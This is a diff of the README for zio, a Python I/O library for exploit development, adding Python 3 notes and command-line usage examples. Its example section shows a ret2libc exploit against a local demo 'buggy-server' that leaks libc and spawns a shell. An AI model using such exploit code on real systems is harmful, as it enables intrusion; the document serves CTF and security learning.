@@ -12,9 +12,9 @@ The following code illustrate the basic idea.
 ```python
 from zio import *
 
-if you_are_debugging_local_server_binary:
+if debug_local:
     io = zio('./buggy-server')            # used for local pwning development
-elif you_are_pwning_remote_server:
+else:
     io = zio(('1.2.3.4', 1337))           # used to exploit remote service
 
 io.write(your_awesome_ropchain_or_shellcode)
@@ -22,16 +22,22 @@ io.write(your_awesome_ropchain_or_shellcode)
 io.interact()
 ```
 
+## Advantage
+
+ - Self contained single file installation, no extra dependency required. Copy it as you go and fire with no pain even without internet access.
+ - Support both python2 and python3, no need to worry about the python version installed on some weired jump server provided by unknown.
+ - Easy to learn and use.
+
 ## License
 
 [zio] use [SATA License](LICENSE.txt) (Star And Thank Author License), so you have to star this project before using. Read the [license](LICENSE.txt) carefully.
 
-## Dependency
+## Working Environment
 
  - Linux or OSX
- - Python 2.6, 2.7
- - termcolor (optional, for color support)
-    - $ pip install termcolor
+ - Python 2.6, 2.7, 3
+
+for windows support, a minimal version(socket-io only) [mini_zio](./mini_zio.py) is provided.
 
 ## Installation
 
@@ -40,8 +46,7 @@ This is a single-file project so in most cases you can just download [zio.py](ht
 pip is also supported, so you can also install by running 
 
 ```bash
-$ pip2 install termcolor # for color support, optional
-$ pip2 install zio
+$ pip install zio
 ```
 
 ## Examples
@@ -51,29 +56,96 @@ from zio import *
 io = zio('./buggy-server')
 # io = zio((pwn.server, 1337))
 
-for i in xrange(1337):
+for i in range(1337):
     io.writeline('add ' + str(i))
     io.read_until('>>')
 
-io.write("add TFpdp1gL4Qu4aVCHUF6AY5Gs7WKCoTYzPv49QSa\ninfo " + "A" * 49 + "\nshow\n")
-io.read_until('A' * 49)
+io.write(b"add TFpdp1gL4Qu4aVCHUF6AY5Gs7WKCoTYzPv49QSa\ninfo " + "A" * 49 + "\nshow\n")
+io.read_until(b'A' * 49)
 libc_base = l32(io.read(4)) - 0x1a9960
 libc_system = libc_base + 0x3ea70
 libc_binsh = libc_base + 0x15fcbf
-payload = 'A' * 64 + l32(libc_system) + 'JJJJ' + l32(libc_binsh)
-io.write('info ' + payload + "\nshow\nexit\n")
-io.read_until(">>")
+payload = b'A' * 64 + l32(libc_system) + b'JJJJ' + l32(libc_binsh)
+io.write(b'info ' + payload + b"\nshow\nexit\n")
+io.read_until(b">>")
 # We've got a shell;-)
 io.interact()
 ```
 
 ## Document
 
-To be added... Please wait...
+### bytes vs unicode
+
+zio works at `bytes` level. All params and return value should be bytes. (Although some methods support unicode for compatibility and fault tolerance)
+
+The recommended practice is to use b'xxx' everywhere, which is supported by both python2 and python3 without ambiguity.
 
 ### about line break and carriage return
 
-Just don't read '\n' or '\r', use `readline()` instead
+Just don't read b'\n' or b'\r', use `read_line()` instead
+
+### Play with cmdline
+
+Act like netcat
+
+```
+$ printf 'GET / HTTP/1.0\r\n\r\n' | ./zio.py baidu.com 80
+```
+
+Unhex
+
+```
+$ echo '3334350a' | ./zio.py -d unhex -w none -r none -i pipe -o pipe --show-input=0 cat
+345
+```
+
+hexcat some file
+
+```
+$ cat somefile | ./zio.py -e hex -w none -r none -i pipe -o pipe --show-input=0 cat
+```
+
+show file in string repr
+
+```
+$ cat somefile | ./zio.py -e repr -w none -r none -i pipe -o pipe --show-input=0 cat
+```
+
+log vim key sequences and underlying io
+
+```
+$ zio --debug=zio.log vim
+```
+
+### Other fun usage
+
+Talk with vim using code.
+
+```
+In [1]: from zio import *
+
+In [2]: io = zio('vim', stdin=TTY, stdout=TTY)
+
+In [3]: io.writeline(b'ihello world')
+ihello world
+Out[3]: 13
+
+In [4]: io.writeline(b'\x1b:w hand_crafted_vim_file.txt')
+w hand_crafted_vim_file.txt
+Out[4]: 30
+
+In [5]: io.writeline(b':q')
+:q
+Out[5]: 3
+
+In [6]: io.exit_status()
+Out[6]: 0
+
+In [7]: !cat hand_crafted_vim_file.txt
+hello world
+```
+
+You can even talk with vim for prefix and then interact by hand to continue normal action.
 
 ## Thanks (Also references)
 
@@ -84,6 +156,5 @@ Just don't read '\n' or '\r', use `readline()` instead
    - http://linux.die.net/man/3/cfmakeraw
    - http://marcocorvi.altervista.org/games/lkpe/tty/tty.htm
    - http://www.linusakesson.net/programming/tty/
-
 
 [zio]:https://github.com/zTrix/zio
